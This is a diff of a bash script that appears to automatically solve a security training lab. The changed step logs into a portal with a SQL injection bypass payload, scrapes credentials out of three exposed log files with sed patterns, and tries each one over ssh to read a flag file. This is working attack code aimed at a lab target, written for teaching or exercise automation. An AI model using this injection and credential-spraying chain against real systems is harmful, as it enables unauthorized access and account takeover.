@@ -60,7 +60,7 @@ step_wrap_round() {
 
 # -- Lab 1: sqli-login -- boolean-true username closes the quote, admin's row matches regardless
 # of password (same payload the lab's hints walk a student to: a single quote, then OR '1'='1').
-# The portal then lists a host account; ssh in with it and read flag.txt.
+# The portal then links three log files that leak accounts; only one logs into the box over ssh.
 step_sqli_login() {
   narrate "Lab 1 -- sqli-login: starting the target"
   local addr flag port
@@ -74,21 +74,33 @@ step_sqli_login() {
     return 0
   fi
   narrate "login portal on port $port -- closing the username's quote with OR '1'='1'"
-  local page user pass askpass
-  page="$(curl -s -X POST "http://$addr:$port/login" \
-    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything')"
-  user="$(printf '%s' "$page" | sed -n 's/.*Username: <code>\([^<]*\)<.*/\1/p' | head -1)"
-  pass="$(printf '%s' "$page" | sed -n 's/.*Password: <code>\([^<]*\)<.*/\1/p' | head -1)"
-  if [ -z "$user" ] || [ -z "$pass" ]; then
-    narrate "sqli-login: no service account behind the login this round -- skipping"
-    return 0
-  fi
-  narrate "the IT notes list a host account ($user) -- trying it over ssh"
+  local jar logs creds user pass askpass
+  jar="$(mktemp)"
+  curl -s -c "$jar" -o /dev/null -X POST "http://$addr:$port/login" \
+    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything'
+  narrate "logged in -- reading the three operations logs for credentials"
+  logs=""
+  for f in print-queue maintenance helpdesk-sync; do
+    logs="$logs$(curl -s -b "$jar" "http://$addr:$port/logs/$f.log")
+"
+  done
+  rm -f "$jar"
+  # Three ways the logs leak a credential: user=/password=, sshpass -p, "credentials user / pw".
+  creds="$(printf '%s' "$logs" | sed -n \
+    -e "s/.* user=\([^ ]*\) password=\([^ ]*\).*/\1 \2/p" \
+    -e "s/.*sshpass -p '\([^']*\)' ssh \([^@ ]*\)@.*/\2 \1/p" \
+    -e "s/.*credentials \([^ ]*\) \/ \([^ ]*\).*/\1 \2/p")"
   askpass="$(mktemp)"
-  printf '#!/bin/sh\necho "%s"\n' "$pass" > "$askpass"
   chmod 700 "$askpass"
-  flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -o StrictHostKeyChecking=accept-new \
-    -o PubkeyAuthentication=no "$user@$addr" 'cat flag.txt' 2>/dev/null | extract_flag)"
+  flag=""
+  while read -r user pass; do
+    [ -n "$user" ] || continue
+    narrate "trying $user over ssh"
+    printf '#!/bin/sh\necho "%s"\n' "$pass" > "$askpass"
+    flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -o StrictHostKeyChecking=accept-new \
+      -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$user@$addr" 'cat flag.txt' 2>/dev/null | extract_flag)"
+    [ -z "$flag" ] || break
+  done <<< "$creds"
   rm -f "$askpass"
   if [ -z "$flag" ]; then
     narrate "sqli-login: no flag over ssh this round -- skipping submit"
